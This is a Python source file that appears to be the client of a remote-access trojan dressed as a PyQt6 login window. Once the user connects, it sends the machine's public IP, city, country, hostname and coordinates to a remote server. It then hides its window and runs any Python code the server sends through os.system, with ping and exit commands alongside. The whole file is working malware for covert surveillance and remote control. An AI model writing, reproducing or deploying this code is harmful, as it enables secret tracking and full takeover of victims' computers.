import socket
import json
import os
from login import Ui_MainWindow
import requests
from PyQt6.QtWidgets import QApplication, QMainWindow
import sys


def get_ip_info():
    response = requests.get('https://ipinfo.io')
    data = response.json()
    return {
        'ip': data.get('ip'),
        'city': data.get('city'),
        'country': data.get('country'),
        'hostname': socket.gethostname(),
        'lat': data.get('loc').split(',')[0],
        'lon': data.get('loc').split(',')[1]
    }

def run_code(code):
    # ghi code vào file
    with open('temp.py', 'w') as f:
        f.write(code)
    # chạy file
    os.system('python temp.py')
    
class LoginWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.ui.pushButton.clicked.connect(self.connect)
        
    def connect(self):
        
        ip = self.ui.lineEdit.text().split(':')[0]
        port = int(self.ui.lineEdit.text().split(':')[1])
        
        
        server_address = (ip, port)
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(server_address)
        ip_info = get_ip_info()
        command = {
            'cmd': 'add',
            'result': {
                'name': os.name,
                'ip': ip_info['ip'],
                'city': ip_info['city'],
                'country': ip_info['country'],
                'hostname': ip_info['hostname'],
                'lat': ip_info['lat'],
                'lon': ip_info['lon']
            }
        }
        json_command = json.dumps(command)
        client_socket.sendall(json_command.encode())

        while True:
            try:
                # tắt app
                self.close()
                data = client_socket.recv(1024*1024).decode()
                json_data = json.loads(data)
                print(json_data)
                if json_data['cmd'] == 'ls_clients':
                    print('List clients:', json_data['result'])
                
                if json_data['cmd'] == 'python':
                    code = json_data['code']
                    run_code(code)
                    
                
                if json_data['cmd'] == 'ping':
                    client_socket.sendall(json.dumps({
                        'cmd': 'pong'
                    }).encode())
                
                if json_data['cmd'] == 'exit':
                    break
            except Exception as e:
                print(e)
                continue
        
        
        
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = LoginWindow()
    window.show()
    sys.exit(app.exec())